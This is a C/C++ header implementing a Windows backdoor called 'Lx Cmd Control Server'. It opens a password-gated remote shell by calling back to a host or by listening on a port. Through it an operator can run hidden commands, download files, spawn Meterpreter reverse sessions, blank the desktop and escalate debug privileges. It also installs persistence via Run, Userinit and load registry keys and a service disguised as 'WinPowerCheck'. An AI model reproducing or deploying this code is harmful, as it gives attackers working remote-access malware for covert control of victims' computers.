#ifndef LKYHEADFILEFORDOOR
#define LKYHEADFILEFORDOOR

#include "WINSOCK2.h"
#include "windows.h"
#pragma comment(lib,"ws2_32.lib")

#include "info.h"
#include "wnetdown.h"
#include "meter.h"

#define CD

#ifdef CD
#define cd(_X_) Sleep(_X_)
#else
#define cd(_X_)
#endif

#include "debug.h"

typedef struct PRA_S
{
	char host[64];
	int port;
	SOCKET sck;
	char info[32];
	int *run;
	int reserve;
}PRA, *LPPRA;

inline void WINAPI trim(char msg[], int len)
{
	if (msg[len - 1] == '\n') len -= 1;	//trim
	if (msg[len - 1] == '\r') len -= 1;
	msg[len] = '\0';

	return;
}

int __stdcall info(SOCKET s)
{
	char info[2048];
	GetInfo(info);
	lxsend(s, info);
	return 0;
}

int __stdcall meterfun(LPVOID lp)
{
	return Meterproc((PMETAST)lp);
}

int __stdcall metasploit(SOCKET s)
{
	METAST lp;
	DWORD id, payload;
	char data[128], tmp[32];

	lxsend(s, "Enter Payload for Meterpreter, leave empty for default\r\n"
		"1.Reverse tcp\r\n"
		"2.Reverse https\r\n"
		"Your choise>"
		);

	id = recv(s, tmp, 128, 0);
	if (id == 1 || id == 0 || tmp[0] == '1')
	{
		payload = 1;

		lxsend(s, "Enter Host for Meterpreter>");
		id = recv(s, data, 128, 0);
		data[id - 1] = '\0';
		lstrcpy(lp.host, data);

		lxsend(s, "Enter Port for Meterpreter>");
		id = recv(s, tmp, 128, 0);
		tmp[id - 1] = '\0';
		lp.port = StrToInt(tmp);
	}
	else payload = 2;

	lp.payload = payload;

	DWORD rt = (DWORD)CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)meterfun, (LPVOID)&lp, 0, &id);

	Sleep(300);		//Give time to Copy the host string

	if (rt == NULL)
	{
		lxsend(s, "Create Meterpreter Failed!");
	}
	else
	{
		lxsend(s, "Create Meterpreter OK!");
		CloseHandle((HANDLE)rt);
	}

	return rt;
}

int __stdcall get(SOCKET s)
{
	char url[512], path[512];
	DWORD rt;

	lxsend(s, "\r\nyour url:");

	rt = recv(s, url, 512, 0);

	if (rt == SOCKET_ERROR || rt == 0)
	{
		return 1;
	}

	trim(url, rt);

	lxsend(s, "\r\nyour path:");

	rt = recv(s, path, 512, 0);

	trim(path, rt);

	if (rt == 0 || rt == SOCKET_ERROR)
	{
		return 1;
	}

	if (int i = HttpDownLoadFile(url, path))
	{
		char msg[512], Err[512];
		GetErr(Err);
		wsprintf(msg, "\r\nDownload %s to %s Error:%d\r\n%s\n", url, path, i, Err);
		lxsend(s, msg);

		return 1;
	}

	lxsend(s, "\r\nDownload to ");
	lxsend(s, path);

	return 0;
}

int __stdcall cmdshell(SOCKET s)
{
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	GetStartupInfoW(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = si.hStdOutput = si.hStdError = (void*)s;

	char buffer[256] = { 0 };
	WCHAR cpath[256] = { 0 };
	DWORD rt = 0;

	lxsend(s, "\r\nCmd path:");
	rt = recv(s, buffer, 256, 0);
	trim(buffer, rt);

	if (buffer[0] == '\0')
	{
		lstrcpyW(cpath, L"c:\\windows\\system32\\cmd.exe");
		lxsend(s, "\r\nUse default cmd path \"cmd.exe\"\r\n ");
	}
	else
	{
		lxsend(s, "\r\nYour cmd path is:");
		lxsend(s, buffer);
		MultiByteToWideChar(CP_ACP, 0, buffer, lstrlen(buffer) + 1, cpath, 256);
	}

	CreateProcessW(cpath, NULL, NULL, NULL, 1, 0, NULL, NULL, &si, &pi);

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);

	return 0;
}

DWORD _stdcall clear(LPVOID lph)
{
	HANDLE h = (HANDLE)lph;

	if (WAIT_TIMEOUT == WaitForSingleObject(h, 7000))
	{
		TerminateProcess(h, 0);
	}

	CloseHandle(h);

	return 0;
}

HDESK hOldDesktop, hNewDesktop;

DWORD __stdcall cmd(LPVOID lp)
{
	char buffer[1024] = { 0 };
	WCHAR cmdline[1024] = { 0 }, cpath[256] = { 0 }, order[1024];
	DWORD rt = 0;
	SOCKET wsh = *((SOCKET *)lp);

	lxsend(wsh, "\r\nCmd path:");
	rt = recv(wsh, buffer, 256, 0);
	trim(buffer, rt);

	if (buffer[0] == '\0')
	{
		lstrcpyW(cpath, L"cmd.exe");
		lxsend(wsh, "\r\nUse default cmd path \"cmd.exe\"\r\n ");
	}
	else
	{
		lxsend(wsh, "\r\nYour cmd path is:");
		lxsend(wsh, buffer);
		MultiByteToWideChar(CP_ACP, 0, buffer, lstrlen(buffer) + 1, cpath, 256);
	}

	while (1)
	{
		lxsend(wsh, "\r\nCmd>");
		Sleep(500);

		rt = recv(wsh, buffer, 1024, 0);

		trim(buffer, rt);

		if (rt == SOCKET_ERROR)
		{
			MsgErr("exit");
			closesocket(wsh);
			return 1;
		}

		if (EQ(buffer, "exit"))
		{
			return 0;
		}

		MultiByteToWideChar(CP_ACP, 0, buffer, lstrlen(buffer) + 1, order, 1024);

		wsprintfW(cmdline, L"%s /c %s", cpath, order);

		SECURITY_ATTRIBUTES sa;
		HANDLE hRead, hWrite;
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;
		CreatePipe(&hRead, &hWrite, &sa, 0);
		STARTUPINFOW si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(STARTUPINFO));
		si.cb = sizeof(STARTUPINFO);
		GetStartupInfoW(&si);
		si.hStdError = hWrite;
		si.hStdOutput = hWrite;
		si.wShowWindow = SW_HIDE;
		si.lpDesktop = L"winsta0\\Blank";
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

		CreateProcessW(NULL, cmdline, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi);
		CloseHandle(hWrite);

		hWrite = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)clear, (LPVOID)(pi.hProcess), 0, &rt);

		if (hWrite) CloseHandle(hWrite);

		ZeroMemory(buffer, 1024);

		while (ReadFile(hRead, buffer, 1024, &rt, NULL))
		{
			send(wsh, (LPSTR)buffer, rt, 0);
			Sleep(200);
		}

		CloseHandle(hRead);
	}	//command loop

	return 0;
}

DWORD WINAPI EnableDebugPriv(char szName[])
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid);
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

	return 0;
}

DWORD WINAPI AutoLoadSet(SOCKET s, char id)
{
	int done = 0;
	char com[256], modname[128];
	HKEY hkey;
	GetModuleFileName(NULL, modname, 256);

	switch (id)
	{
	case '1':
		if (ERROR_SUCCESS == RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", &hkey))
		{
			if (ERROR_SUCCESS == RegSetValueEx(hkey, "SysPowerCheck", 0, REG_SZ, (const unsigned char *)modname, lstrlen(modname)))
			{
				done = 1;
			}
			RegCloseKey(hkey);
		}

		break;

	case '2':
		lstrcat(modname, " -k");	//Indicate for run as service

		HANDLE h;
		h = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

		if (h != NULL)
		{
			HANDLE sc = CreateService((struct SC_HANDLE__ *)h, "WinPowerCheck", "Provide support for power management",
				SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
				SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
				modname, NULL, NULL, NULL, NULL, NULL);

			if (sc != NULL)
			{
				//HANDLE myc=OpenService(h,"WinPowerCheck",SC_MANAGER_ALL_ACCESS);
				//if(!StartService(myc,0,NULL))	lxsend(s,"Start Service Error");
				//lxsend(s,"Create Service Done!\n");
				done = 1;
				CloseHandle(sc);
			}

			CloseHandle(h);
		}
		else
		{
			lxsend(s, "Open SCManager Failed\r\n");
		}

		break;

	case '3':
		if (ERROR_SUCCESS == RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\", &hkey))
		{
			if (ERROR_SUCCESS == RegSetValueEx(hkey, "SysPowerCheck", 0, REG_SZ, (const unsigned char *)modname, lstrlen(modname)))
			{
				done = 1;
			}
			RegCloseKey(hkey);
		}

		break;

	case '4':
		if (ERROR_SUCCESS == RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", &hkey))
		{
			wsprintf(com, "Userinit.exe,%s", modname);

			if (ERROR_SUCCESS == RegSetValueEx(hkey, "Userinit", 0, REG_SZ, (const unsigned char *)com, lstrlen(com)))
			{
				done = 1;
			}
			RegCloseKey(hkey);
		}

		break;

	case '5':
		if (ERROR_SUCCESS == RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\", &hkey))
		{
			if (ERROR_SUCCESS == RegSetValueEx(hkey, "load", 0, REG_SZ, (const unsigned char *)modname, lstrlen(modname)))
			{
				done = 1;
			}
			RegCloseKey(hkey);
		}

		break;

	case '6':

		if (AutoLoadSet(s, '1') || AutoLoadSet(s, '2') || AutoLoadSet(s, '3') || AutoLoadSet(s, '4') || AutoLoadSet(s, '5')) return 1;

		return 0;

		break;

	default:
		break;
	}

	if (done == 0)
	{
		wsprintf(com, "Autorun Method %c Error\r\n", id);
		lxsend(s, com);
		return 0;
	}
	else
	{
		wsprintf(com, "Autorun Done with Method %c\r\n", id);
		lxsend(s, com);
		return 1;
	}
}

DWORD WINAPI Autorun(SOCKET s)
{
	lxsend(s, "1.Auto Run Reg Key\r\n"
		"2.Run as Service\r\n"
		"3.Explorer run Reg Key\r\n"
		"4.Userinit Reg Key\r\n"
		"5.Load Reg Key\r\n"
		"6.All method Until complete\r\n"
		"Autorun Method:");

	char tmp[16];
	int rt = recv(s, tmp, 16, 0);

	AutoLoadSet(s, tmp[0]);

	return 1;
}

DWORD __stdcall doorshell(LPVOID lp)
{
	LPPRA lpa = (LPPRA)lp;
	SOCKET hSocket = lpa->sck;
	int mod = 0, rt;
	char buf[1024];

	lxsend(hSocket, "Lx Cmd Control Server Ver 6.0\r\n"
		"CopyRight 2010-2015\r\n"
		"\r\nEnter Password:"
		);

	rt = recv(hSocket, buf, 256, 0);

	trim(buf, rt);

	if (lstrcmp(buf, lpa->info))
	{
		Msg(buf);
		lxsend(hSocket, "\r\nPassword Error\r\n");
		shutdown(hSocket, 0);
		closesocket(hSocket);
		return 0;
	}

	lxsend(hSocket, "\r\nPassword OK\r\n");

	hOldDesktop = OpenDesktop("default", 0, FALSE, GENERIC_ALL);
	hNewDesktop = CreateDesktop("Blank", 0, 0, DF_ALLOWOTHERACCOUNTHOOK, GENERIC_ALL, 0);

	while (1)
	{
		lxsend(hSocket, "\r\nShell>");

		rt = recv(hSocket, buf, 1024, 0);

		if (rt == SOCKET_ERROR)
		{
			MsgErr("exit");
			shutdown(hSocket, 0);
			closesocket(hSocket);
			return 0;
		}

		trim(buf, rt);

		if (EQ(buf, "exit"))
		{
			if (mod == 0)
			{
				shutdown(hSocket, 0);
				closesocket(hSocket);
				return 0;
			}

			mod = 0;
			continue;
		}

		if (mod == 0)
		{
			if (EQ(buf, "info"))	//info
			{
				info(hSocket);
			}
			else if (EQ(buf, "get"))	//get file
			{
				if (get(hSocket))
				{
					lxsend(hSocket, "\r\nDownLoad failed!\r\n");
				}
			}
			else if (EQ(buf, "cmd"))	//cmd
			{
				if (cmd((LPVOID)&hSocket))	//recv err
				{
					break;
				}
			}
			else if (EQ(buf, "cmdshell") || EQ(buf, "shell"))	//cmd shell with socket
			{
				cmdshell(hSocket);
			}
			else if (EQ(buf, "meta") || EQ(buf, "metasploit"))	//meta
			{
				metasploit(hSocket);
			}
			else if (EQ(buf, "blank"))
			{
				SwitchDesktop(hNewDesktop);
				lxsend(hSocket, "Blank OK\r\n");
			}
			else if (EQ(buf, "restore"))
			{
				SwitchDesktop(hOldDesktop);
				lxsend(hSocket, "Restore OK\r\n");
			}
			else if (EQ(buf, "help"))	//help info
			{
				lxsend(hSocket, "\r\n"
					"1.Info\r\n"
					"2.Get\r\n"
					"3.Socks start/stop\r\n"
					"4.Cmd line\r\n"
					"5.CmdShell\r\n"
					"6.Metasploit\r\n"
					"7.Install\r\n"
					"8.Blank/Restore desktop\r\n"
					"9.End Shell\r\n"
					);
			}
			else if (EQ(buf, "install"))	//install as autorun
			{
				Autorun(hSocket);
			}
			else if (EQ(buf, "End"))	//end server
			{
				lxsend(hSocket, "\r\nPassword requied:");
				rt = recv(hSocket, buf, 256, 0);

				trim(buf, rt);

				if (lstrcmp(buf, lpa->info))
				{
					lxsend(hSocket, "\r\nPassword Error,Shutdown denied.\r\n");
				}
				else
				{
					lxsend(hSocket, "\r\nServer will now Shutdown.\r\n");
					*lpa->run = 1;
					shutdown(hSocket, 0);
					closesocket(hSocket);
					return -1;
				}
			}
			else	//default
			{
				lxsend(hSocket, "\r\nUnknown Command\r\n");
			}
		}	//mod 0
	}	//while

	//closesocket(s);	//leave this to deal by caller

	return 0;
}

DWORD __stdcall netdoor(LPVOID lp)
{
	SOCKET hSocket;
	LPPRA lpa = (LPPRA)lp;
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	hSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	__try
	{
		SOCKADDR_IN addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(lpa->port);
		addr.sin_addr.S_un.S_addr = resolve((LPSTR)lpa->host);

		while (connect(hSocket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR)
		{
			MsgErr("Cannot Connect");
			cd(1000);
		}

		lpa->sck = hSocket;
		doorshell((LPVOID)lpa);
	}
	__finally
	{
		MsgErr("Connect Error");
		closesocket(hSocket);
	}

	WSACleanup();

	return 0;
}

DWORD _stdcall netdoor(int port, char phost[], char lppwd[])
{
	PRA pa;
	pa.port = (int)port;
	lstrcpy(pa.info, lppwd);
	lstrcpy(pa.host, phost);

	return netdoor((LPVOID)&pa);
}

DWORD _stdcall listendoor(LPVOID lp)
{
	SOCKET wsl;
	LPPRA lpa = (LPPRA)lp;
	int port = lpa->port;
	struct sockaddr_in door;

	WSADATA data;

	if (WSAStartup(MAKEWORD(2, 2), &data) != 0)
	{
		return 0;
	}

	while ((wsl = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)) == INVALID_SOCKET)
	{
		//socket(PF_INET, SOCK_STREAM, 0)
		Sleep(1000);
	}

	door.sin_family = PF_INET;
	door.sin_addr.s_addr = htonl(INADDR_ANY);
	door.sin_port = htons(port);

	if (bind(wsl, (const struct sockaddr *) &door, sizeof(door)) == SOCKET_ERROR)
	{
		closesocket(wsl);
		return 0;
	}

	while (listen(wsl, SOMAXCONN) == SOCKET_ERROR)
	{
		closesocket(wsl);
		Sleep(1000);
	}

	SOCKET wsh;
	struct sockaddr_in client;
	DWORD rt;
	int nSize = sizeof(client);
	HANDLE thread;
	PRA thlpa;

	int end = 0;

	while (1)
	{
		if (end != 0) break;

		__try
		{
			if ((wsh = accept(wsl, (struct sockaddr *)&client, &nSize)) != SOCKET_ERROR)
			{
				thlpa.sck = wsh;
				thlpa.run = &end;
				lstrcpy(thlpa.info, lpa->info);
				thread = CreateThread(NULL, NULL, doorshell, (LPVOID)&thlpa, 0, &rt);
				if (thread) CloseHandle(thread);
			}
		}
		__except (1)
		{}

		Sleep(2000);
	}	//listen loop

	WSACleanup();

	return 0;
}

DWORD _stdcall listendoor(int port, char lppwd[])
{
	PRA pa;
	pa.port = port;
	lstrcpy(pa.info, lppwd);

	return listendoor((LPVOID)&pa);
}

#endif
